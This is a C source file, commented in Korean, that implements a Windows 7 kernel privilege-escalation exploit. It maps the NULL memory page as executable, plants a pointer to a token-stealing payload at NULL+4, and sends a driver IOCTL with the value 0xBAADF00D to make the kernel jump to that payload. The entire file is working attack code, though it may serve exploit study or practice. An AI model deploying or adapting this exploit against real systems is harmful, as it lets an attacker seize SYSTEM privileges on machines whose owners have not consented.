#include "NullPointerDereference.h"
#include "Common.h"

BOOLEAN 
MapNullPage(VOID)
{
	BOOLEAN bRetValue = FALSE;
	HMODULE hModule = NULL;
	ULONG_PTR ulptrRegionSize = 0x1000;
	PVOID pvBaseAddress = (PVOID)0x1;
	NTSTATUS status = 0;
	NTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;

	hModule = GetModuleHandle(L"ntdll.dll");

	NtAllocateVirtualMemory = (NTALLOCATEVIRTUALMEMORY)GetProcAddress(hModule, "NtAllocateVirtualMemory");

	if (NULL == NtAllocateVirtualMemory)
	{
		goto _RET;
	}

	// Windows 10에는 할당이 NULL 영역 MAPPING이 실패한다. 보호 기법이 추가.
	status = NtAllocateVirtualMemory(
		(HANDLE)-1, 
		&pvBaseAddress, 
		0, 
		(PULONG)&ulptrRegionSize,
		MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE
	);

	if (0 != status)
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	if (NULL != hModule)
	{
		FreeLibrary(hModule);
	}

	return bRetValue;
}

BOOLEAN
NullPointerDereferenceExploitForWin7(VOID)
{
	BOOLEAN bRetValue = FALSE;
	PVOID EopPayload = &TokenStealingPayloadWin7;
	ULONG MagicValue = 0xBAADF00D;
	PVOID NullPointerPlus4 = NULL;
	ULONG_PTR ulptrRestoreNullPointerPlus4 = 0;
	PVOID NullPageBaseAddress = NULL;

	// NULL Page 맵핑
	if (!MapNullPage())
	{
		goto _RET;
	}
	
	// NULL + 4, NULL + 8 주소를 가지고 온다.
	NullPointerPlus4 = (PVOID)((ULONG_PTR)NullPageBaseAddress + sizeof(ULONG_PTR));

	// NULL + 4, NULL + 8 주소에 저장된 값을 백업한다. (보통 NULL)
	ulptrRestoreNullPointerPlus4 = *(PULONG_PTR)NullPointerPlus4;

	// NULL + 4, NULL + 8 주소에 Payload를 기록한다.
	*(PULONG_PTR)NullPointerPlus4 = (ULONG_PTR)EopPayload;	

	// BAAADF00D 코드 전송
	bRetValue = SendIOCTL(
		NULL_POINTER_DEREFERENCE_CONTROL_CODE,
		(PVOID)&MagicValue,
		0
		);

	if (FALSE == bRetValue)
	{
		goto _RET;
	}

	// NULL + 4, NULL + 8 주소 값을 복원한다.
	*(PULONG_PTR)NullPointerPlus4 = ulptrRestoreNullPointerPlus4;

	// NULL Page 언맵핑
	if (!UnMapNullPage())
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	return bRetValue;
}

BOOLEAN
UnMapNullPage(VOID)
{
	BOOLEAN bRetValue = FALSE;
	HMODULE hModule = NULL;
	ULONG_PTR ulptrRegionSize = 0;
	PVOID pvBaseAddress = (PVOID)0x1;
	NTFREEVIRTUALMEMORY NtFreeVirtualMemory = NULL;
	NTSTATUS status = 0;

	hModule = GetModuleHandle(L"ntdll.dll");

	NtFreeVirtualMemory = (NTFREEVIRTUALMEMORY)GetProcAddress(hModule, "NtFreeVirtualMemory");

	if (NULL == NtFreeVirtualMemory)
	{
		goto _RET;
	}

	status = NtFreeVirtualMemory(
		(HANDLE)-1,
		&pvBaseAddress,
		(PULONG)&ulptrRegionSize,
		MEM_RELEASE
	);

	if (0 != status)
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	if (NULL != hModule)
	{
		FreeLibrary(hModule);
	}

	return bRetValue;
}